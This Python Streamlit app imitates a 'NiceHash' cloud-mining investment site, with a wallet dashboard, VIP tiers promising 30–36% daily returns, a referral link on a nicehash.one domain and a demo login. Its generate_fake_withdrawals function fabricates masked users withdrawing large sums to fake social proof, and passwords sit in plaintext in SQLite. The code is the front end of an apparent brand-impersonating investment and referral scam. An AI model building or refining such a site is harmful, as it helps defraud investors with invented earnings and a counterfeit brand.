# ==============================================================================
# --- 0. FORCE COMPATIBILITY SHIELD (CRITICAL FOR PYTHON 3.14 BYPASS) ---
# ==============================================================================
import os
import sys

# Google Protobuf engine bypass for stability
os.environ["PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION"] = "python"

import streamlit as st
import sqlite3
import random
import time
import pandas as pd

# ==============================================================================
# --- 1. INITIALIZATION & CORE SYSTEM ---
# ==============================================================================
st.set_page_config(
    page_title="NiceHash - Cloud Mining", 
    page_icon="⚡", 
    layout="wide",
    initial_sidebar_state="collapsed"
)

# Database Initialization
def init_nicehash_db():
    conn = sqlite3.connect("nicehash_vault.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY, password TEXT, security_pin TEXT,
            invest_wallet REAL, commission_wallet REAL, vip_level TEXT, invite_code TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS mining_contracts (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, vip_level TEXT, 
            investment REAL, daily_yield REAL, status TEXT, date_activated TEXT
        )
    """)
    cursor.execute("INSERT OR IGNORE INTO users VALUES ('demo@gmail.com', 'demo123', '1122', 0.00, 0.00, 'VIP0', '286651')")
    conn.commit()
    conn.close()

def query_db(query, args=(), one=False, commit=False):
    conn = sqlite3.connect("nicehash_vault.db", check_same_thread=False)
    cursor = conn.cursor()
    try:
        cursor.execute(query, args)
        if commit:
            conn.commit()
            conn.close()
            return True
        rv = cursor.fetchall()
        conn.close()
        return (rv[0] if rv else None) if one else rv
    except Exception as e:
        conn.close()
        return None if one else []

init_nicehash_db()

# State Registry Management
if 'logged_in' not in st.session_state: st.session_state.logged_in = False
if 'current_user' not in st.session_state: st.session_state.current_user = ""
if 'active_tab' not in st.session_state: st.session_state.active_tab = "Home"
if 'show_news' not in st.session_state: st.session_state.show_news = True

# --- Real-time Logs Pool ---
emails_pool = ['a***3v@yahoo.com', 'o***de@yahoo.com', 'r***s8@gmail.com', 'k***m2@gmail.com', 't***77@live.com']
phones_pool = ['+62****17', '+92****92', '+91****43', '+44****88', '+1****52']

def generate_fake_withdrawals():
    logs = []
    random.seed(int(time.time() / 60)) # Smooth updates
    for i in range(4):
        identity = random.choice(emails_pool if i % 2 == 0 else phones_pool)
        amount = round(random.uniform(1200.00, 89000.00), 2)
        logs.append(f"{identity} &nbsp; withdrew &nbsp; <span style='color:#ff6a00; font-weight:700;'>${amount}</span>")
    return logs

# ==============================================================================
# --- 2. PREMIUM APP STYLING (YOUR ORIGINAL DESIGN MATCHED) ---
# ==============================================================================
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
footer, .stDeployButton, #MainMenu, [data-testid="stStatusWidget"], [data-testid="stHeader"] { display: none !important; }

html, body, .stApp { background-color: #12161a !important; color: #ffffff !important; font-family: 'Inter', sans-serif !important; }

/* Mobile View Container Setup */
[data-testid="stVerticalBlock"] { max-width: 450px !important; margin: 0 auto !important; padding: 10px !important; background: #1c2127 !important; border-radius: 0px !important; min-height: 100vh; }

/* Custom Luxury Header Row */
.nh-top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #2a313a; padding-bottom: 10px; }
.nh-logo-title { font-size: 22px; font-weight: 800; color: #ffffff; display: flex; align-items: center; gap: 8px; }
.nh-logo-icon { width: 30px; height: 30px; background: radial-gradient(circle, #ffaa00 0%, #ff6a00 100%); border-radius: 50%; display: inline-block; position: relative; }
.nh-logo-icon::after { content: ''; position: absolute; width: 12px; height: 12px; background: #1c2127; left: 9px; top: 9px; border-radius: 2px; }

/* Assets Wallet Cards */
.asset-premium-card { background: linear-gradient(135deg, #1e2530 0%, #151921 100%); border-radius: 14px; padding: 20px; border: 1px solid #2a313a; position: relative; margin-bottom: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
.asset-total-title { color: #a0aec0; font-size: 13px; font-weight: 500; text-align: center; }
.asset-total-value { font-size: 32px; font-weight: 800; color: #ffffff; text-align: center; margin: 5px 0; font-family: monospace; }
.sub-wallet-row { display: flex; justify-content: space-between; padding: 8px 0; border-top: 1px solid rgba(255,255,255,0.06); font-size: 13px; color: #cbd5e0; }

/* Grid Icons Row */
.grid-icons-container { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; text-align: center; margin-bottom: 18px; }
.icon-box-item { background: #252b34; border-radius: 14px; width: 52px; height: 52px; line-height: 52px; font-size: 22px; margin: 0 auto 5px auto; border: 1px solid #313945; color: #ff6a00; }
.icon-label-item { font-size: 11px; font-weight: 500; color: #cbd5e0; }

/* Marquee Scroller */
.marquee-alert-box { display: flex; align-items: center; background: #212730; border-radius: 8px; padding: 6px 12px; border: 1px solid #2c3440; margin-bottom: 15px; font-size: 12px; overflow: hidden; }
.marquee-text-flow { white-space: nowrap; animation: textScroll 15s linear infinite; }
@keyframes textScroll { 0% { transform: translate3d(100%, 0, 0); } 100% { transform: translate3d(-100%, 0, 0); } }

/* Fan Simulation Animation */
.cooling-fan-hardware { width: 130px; height: 130px; background: radial-gradient(circle, #2d3542 0%, #171c24 100%); border-radius: 50%; border: 4px solid #3a4454; margin: 20px auto; display: flex; align-items: center; justify-content: center; position: relative; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
.fan-blades-wing { width: 100px; height: 100px; background: repeating-conic-gradient(from 0deg, #3f4a5c 0deg 30deg, #1f252e 30deg 60deg); border-radius: 50%; animation: spinHardware 1.5s linear infinite; }
@keyframes spinHardware { 100% { transform: rotate(360deg); } }
.fan-center-core { position: absolute; width: 30px; height: 30px; background: #171c24; border: 2px solid #ff6a00; border-radius: 50%; color: #ff6a00; font-weight: 800; font-size: 12px; line-height: 26px; text-align: center; }

/* Buttons Overrides */
div.stButton > button {
    background: linear-gradient(90deg, #ff8c00 0%, #ff5500 100%) !important; color: #ffffff !important; font-weight: 700 !important; border-radius: 8px !important; width: 100% !important; border: none !important; padding: 10px !important;
}
</style>
""", unsafe_allow_html=True)

# App Logo Header Display
st.markdown("""
<div class="nh-top-bar">
    <div class="nh-logo-title"><div class="nh-logo-icon"></div> nicehash</div>
    <div style="background:#252b34; padding:4px 10px; border-radius:12px; font-size:11px; font-weight:600; color:#ff6a00; border:1px solid #313945;">🌐 English</div>
</div>
""", unsafe_allow_html=True)

# Sync Database Values
invest_bal, comm_bal, vip_level, user_invite = 0.00, 0.00, "VIP0", "286651"
if st.session_state.logged_in:
    u_data = query_db("SELECT invest_wallet, commission_wallet, vip_level, invite_code FROM users WHERE username=?", (st.session_state.current_user,), one=True)
    if u_data: invest_bal, comm_bal, vip_level, user_invite = u_data

# ==============================================================================
# --- 3. THE FIXED POPUP NEWS BOX (SAME ORIGINAL LOOK + STREAMLIT CLOSE) ---
# ==============================================================================
if st.session_state.show_news and st.session_state.active_tab == "Home":
    st.markdown("""
    <div style="background: rgba(0,0,0,0.85); position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 999999; display: flex; align-items: center; justify-content: center; padding: 15px;">
        <div style="background: #1c2127; max-width: 400px; width:100%; border-radius: 16px; border: 1px solid #ff6a00; padding: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.9); max-height: 90vh; overflow-y: auto;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                <h3 style="color:#ffffff; margin:0; font-weight:800; font-size:22px; text-align:center; width:100%;">News</h3>
            </div>
            <div style="font-size:13px; color:#cbd5e0; line-height:1.6; margin-bottom: 20px;">
                🎉 <b>NiceHash · A New Era of Mining for Everyone</b><br>
                <b>Officially launched on May 31, 2026.</b><br>
                💡 Unlock and earn your first earnings now!<br>
                No waiting, no complicated operations, earnings arrive instantly.<br>
                🔥 Here, let's explore the infinite potential of cryptocurrencies together.<br>
                <b>A new era truly begins the moment you join us.</b>
                <hr style="border-color:rgba(255,255,255,0.1); margin:12px 0;">
                <span style="color:#ff6a00; font-weight:700;">✨ VIP Mission Unlocking Plan - Enjoy Instant Recharge</span>
                <table style="width:100%; border-collapse:collapse; margin-top:10px; font-size:11px; text-align:center; color:#fff;">
                    <tr style="background:#2d3542; font-weight:700;">
                        <th style="padding:6px; border:1px solid #3a4454;">Grade</th>
                        <th style="padding:6px; border:1px solid #3a4454;">Investment</th>
                        <th style="padding:6px; border:1px solid #3a4454;">Daily</th>
                        <th style="padding:6px; border:1px solid #3a4454;">Yield</th>
                    </tr>
                    <tr><td style="padding:5px; border:1px solid #3a4454;">VIP1</td><td style="padding:5px; border:1px solid #3a4454;">10</td><td style="padding:5px; border:1px solid #3a4454;">3</td><td style="padding:5px; border:1px solid #3a4454;">30%</td></tr>
                    <tr><td style="padding:5px; border:1px solid #3a4454;">VIP2</td><td style="padding:5px; border:1px solid #3a4454;">100</td><td style="padding:5px; border:1px solid #3a4454;">32</td><td style="padding:5px; border:1px solid #3a4454;">32%</td></tr>
                    <tr><td style="padding:5px; border:1px solid #3a4454;">VIP3</td><td style="padding:5px; border:1px solid #3a4454;">1000</td><td style="padding:5px; border:1px solid #3a4454;">340</td><td style="padding:5px; border:1px solid #3a4454;">34%</td></tr>
                    <tr><td style="padding:5px; border:1px solid #3a4454;">VIP4</td><td style="padding:5px; border:1px solid #3a4454;">5000</td><td style="padding:5px; border:1px solid #3a4454;">1800</td><td style="padding:5px; border:1px solid #3a4454;">36%</td></tr>
                </table>
            </div>
    """, unsafe_allow_html=True)
    
    # Original 'Got It' Close Button integrated inside Streamlit framework safely
    if st.button("Got it", key="nh_news_close_action_btn"):
        st.session_state.show_news = False
        st.rerun()
        
    st.markdown("</div></div>", unsafe_allow_html=True)

# ==============================================================================
# --- 4. VIEWS ROUTER PANEL ---
# ==============================================================================

# --- HOME VIEW ---
if st.session_state.active_tab == "Home":
    st.markdown("""
    <div style="width:100%; height:110px; background: linear-gradient(135deg, #2c3440 0%, #151921 100%); border-radius:12px; display:flex; align-items:center; justify-content:center; border:1px solid #2e3742; margin-bottom:15px;">
        <div style="font-size:26px; font-weight:900; color:#ff6a00; letter-spacing:2px;">nice<span style="color:#ffffff;">hash</span></div>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown("""
    <div class="marquee-alert-box">
        <span style="color:#ff6a00; margin-right:8px;">📢</span>
        <div class="marquee-text-flow">Unlock and earn your first earnings now! No waiting, no complicated operations, earnings arrive instantly.</div>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown(f"""
    <div class="asset-premium-card">
        <div class="asset-total-title">Total assets</div>
        <div class="asset-total-value">${(invest_bal + comm_bal):,.2f}</div>
        <div class="sub-wallet-row"><span>Invest wallet</span><span style="font-weight:700; color:#fff;">${invest_bal:,.2f}</span></div>
        <div class="sub-wallet-row" style="border:none; padding-bottom:0;"><span>Commission wallet</span><span style="font-weight:700; color:#fff;">${comm_bal:,.2f}</span></div>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown("""
    <div class="grid-icons-container">
        <div><div class="icon-box-item">🏛️</div><div class="icon-label-item">Deposit</div></div>
        <div><div class="icon-box-item">🏧</div><div class="icon-label-item">Withdraw</div></div>
        <div><div class="icon-box-item">👑</div><div class="icon-label-item">VIP</div></div>
        <div><div class="icon-box-item">💡</div><div class="icon-label-item">Events</div></div>
    </div>
    """, unsafe_allow_html=True)
    
    # Withdrawal logs design restore
    st.markdown("<div style='font-size:13px; font-weight:700; margin-bottom:8px; color:#ff6a00;'>Withdraw log</div>", unsafe_allow_html=True)
    for log in generate_fake_withdrawals():
        st.markdown(f"<div style='background:#212730; padding:10px; border-radius:8px; margin-bottom:6px; font-size:12px; border:1px solid #2c3440;'>🎉 {log}</div>", unsafe_allow_html=True)

# --- VIP VIEW ---
elif st.session_state.active_tab == "VIP":
    st.markdown(f"""
    <div style="background:#212730; padding:15px; border-radius:12px; border:1px solid #2e3642; margin-bottom:15px;">
        <div style="display:flex; justify-content:space-between; font-size:13px; color:#a0aec0;"><span>Current Level</span><span style="color:#00ffcc; font-weight:700;">{vip_level}</span></div>
    </div>
    """, unsafe_allow_html=True)
    
    for i in range(1, 5):
        min_amt = [0, 10, 100, 1000, 5000][i]
        yield_pct = [0, 30, 32, 34, 36][i]
        st.markdown(f"""
        <div style="background:#1e252e; border-radius:12px; padding:15px; border:1px solid #2c3440; margin-bottom:10px;">
            <div style="font-weight:800; font-size:15px; color:#ff6a00;">VIP {i}</div>
            <div style="display:flex; justify-content:space-between; font-size:12px; margin-top:5px;"><span style="color:#a0aec0;">Investment bounds</span><span style="color:#fff;">${min_amt:,.2f}+</span></div>
            <div style="display:flex; justify-content:space-between; font-size:12px;"><span style="color:#a0aec0;">Daily Profit</span><span style="color:#00ffcc; font-weight:700;">{yield_pct}%</span></div>
        </div>
        """, unsafe_allow_html=True)

# --- MINING VIEW ---
elif st.session_state.active_tab == "Mining":
    st.markdown("""
    <div class="cooling-fan-hardware"><div class="fan-blades-wing"></div><div class="fan-center-core">⚡</div></div>
    """, unsafe_allow_html=True)
    st.markdown("""
    <div style="background:#212730; padding:15px; border-radius:12px; border:1px solid #2e3642; text-align:center;">
        <h3 style="margin:0; font-size:24px; color:#fff;">0.000000 <span style="font-size:12px; color:#ff6a00;">USDT</span></h3>
        <p style="color:#a0aec0; font-size:12px; margin:5px 0 0 0;">Cloud Engine Status: Active</p>
    </div>
    """, unsafe_allow_html=True)

# --- TEAM VIEW ---
elif st.session_state.active_tab == "Team":
    st.markdown(f"""
    <div style="background:#212730; padding:15px; border-radius:12px; border:1px solid #2e3642;">
        <span style="font-size:12px; color:#a0aec0;">My Referral Code</span>
        <h2 style="margin:5px 0; color:#ff6a00;">{user_invite}</h2>
        <small style="color:#cbd5e0;">Link: https://nicehash.one/#/reg?invite=286651</small>
    </div>
    """, unsafe_allow_html=True)

# --- ME VIEW ---
elif st.session_state.active_tab == "Me":
    if not st.session_state.logged_in:
        st.markdown("<h4 style='text-align:center; color:#ff6a00;'>SECURITY RE-AUTHENTICATION</h4>", unsafe_allow_html=True)
        u_in = st.text_input("Account Email:", placeholder="demo@gmail.com")
        p_in = st.text_input("Password Key:", type="password", placeholder="demo123")
        if st.button("SECURE LOGIN"):
            if u_in.strip() == "demo@gmail.com" and p_in.strip() == "demo123":
                st.session_state.logged_in = True
                st.session_state.current_user = "demo@gmail.com"
                st.rerun()
            else: st.error("Wrong Key parameters.")
    else:
        st.markdown(f"<div style='background:#212730; padding:15px; border-radius:12px;'>👤 <b>Account:</b> {st.session_state.current_user}</div>", unsafe_allow_html=True)
        dep_amt = st.number_input("Add Test Deposit ($):", min_value=10.0, step=50.0)
        if st.button("EXECUTE LIVE DEPOSIT"):
            query_db("UPDATE users SET invest_wallet = invest_wallet + ? WHERE username=?", (dep_amt, st.session_state.current_user), commit=True)
            st.success("Wallet Updated!")
            st.rerun()
        if st.button("LOGOUT SYSTEM"):
            st.session_state.logged_in = False
            st.rerun()

# ==============================================================================
# --- 5. PREMIUM BOTTOM NAVIGATION BAR ---
# ==============================================================================
st.markdown("<div style='margin-top:40px;'></div>", unsafe_allow_html=True)
nav_cols = st.columns(5)
with nav_cols[0]:
    if st.button("🏠\nHome", key="nav_h"): st.session_state.active_tab = "Home"; st.rerun()
with nav_cols[1]:
    if st.button("👑\nVIP", key="nav_v"): st.session_state.active_tab = "VIP"; st.rerun()
with nav_cols[2]:
    if st.button("⚡\nMine", key="nav_m"): st.session_state.active_tab = "Mining"; st.rerun()
with nav_cols[3]:
    if st.button("👥\nTeam", key="nav_t"): st.session_state.active_tab = "Team"; st.rerun()
with nav_cols[4]:
    if st.button("👤\nMe", key="nav_me"): st.session_state.active_tab = "Me"; st.rerun()
